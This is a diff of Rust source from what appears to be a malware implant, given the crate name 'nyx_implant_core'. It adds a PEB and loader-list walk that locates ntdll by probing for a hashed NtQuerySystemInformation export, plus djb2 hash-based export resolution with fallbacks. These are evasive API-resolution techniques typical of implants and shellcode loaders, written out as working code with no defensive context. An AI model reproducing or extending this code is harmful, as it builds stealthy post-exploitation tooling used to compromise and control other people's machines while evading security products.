@@ -127,6 +127,60 @@ fn ascii_lower(name: &[u8]) -> ([u8; 32], usize) {
     (buf, n)
 }
 
+/// Minimal PE-image check: MZ magic + valid e_lfanew + PE signature.
+unsafe fn is_pe_image(p: *const u8) -> bool {
+    if (p as usize) < 0x10000 {
+        return false;
+    }
+    let mz = *(p as *const u16);
+    if mz != 0x5A4D {
+        return false;
+    }
+    let e = *(p.add(0x3C) as *const i32) as usize;
+    e < 0x1000 && *(p.add(e) as *const u32) == 0x0000_4550
+}
+
+/// Locate ntdll by walking the loader's InLoadOrder list and testing each
+/// DllBase (entry+0x30, layout-stable across builds) for the
+/// NtQuerySystemInformation export — the base-dll-name fields moved on
+/// 24H2, so name matching is unreliable; export probing is not.
+unsafe fn ntdll_via_export_walk() -> Option<usize> {
+    let peb: usize;
+    core::arch::asm!(
+        "mov {}, gs:[0x60]",
+        out(reg) peb,
+        options(nostack, preserves_flags, readonly),
+    );
+    if peb == 0 {
+        return None;
+    }
+    let ldr = *((peb as *const u8).add(0x18) as *const usize);
+    if ldr == 0 {
+        return None;
+    }
+    let ldr_p = ldr as *const u8;
+    let mut flink = *(ldr_p.add(0x10) as *const usize);
+    for _ in 0..96 {
+        if flink == 0 || flink == ldr + 0x10 {
+            return None;
+        }
+        let flink_p = flink as *const u8;
+        let dllbase = *(flink_p.add(0x30) as *const usize);
+        if dllbase != 0 && is_pe_image(dllbase as *const u8) {
+            if nyx_implant_core::resolve::export_addr_by_hash_pub(
+                dllbase as *mut u8,
+                nyx_implant_core::resolve::djb2(b"NtQuerySystemInformation"),
+            )
+            .is_some()
+            {
+                return Some(dllbase);
+            }
+        }
+        flink = *(flink_p.add(0x8) as *const usize);
+    }
+    None
+}
+
 pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
     // Diagnostic PEB walk: gs:[0x60] -> PEB -> Ldr -> InLoadOrder list.
     // Falls through to resolve::export_addr (which may still succeed) but
@@ -184,6 +238,9 @@ pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
             out(reg) ret,
             options(nostack, preserves_flags, readonly),
         );
+        if ret < 0x7FF0_0000_0000 || ret >= 0x8000_0000_0000 {
+            return None;
+        }
         let mut cand = (ret & !0xFFF) as *mut u8;
         for _ in 0..0x400 {
             let mz = unsafe { *(cand as *const u16) };
@@ -221,7 +278,24 @@ pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
             }
         }
     }
-    // 2) thread return address -> ntdll scan
+    // 2) loader-walk by export feature (name fields moved on 24H2)
+    if let Some(nt) = ntdll_via_export_walk() {
+        if let Some(r) = nyx_implant_core::resolve::export_addr_by_hash_pub(
+            nt as *mut u8,
+            nyx_implant_core::resolve::djb2(func),
+        ) {
+            return Some(r);
+        }
+        if lower != func {
+            if let Some(r) = nyx_implant_core::resolve::export_addr_by_hash_pub(
+                nt as *mut u8,
+                nyx_implant_core::resolve::djb2(lower),
+            ) {
+                return Some(r);
+            }
+        }
+    }
+    // 3) thread return address -> ntdll scan (last resort)
     if let Some(r) = scan_ntdll(nyx_implant_core::resolve::djb2(func)) {
         return Some(r);
     }
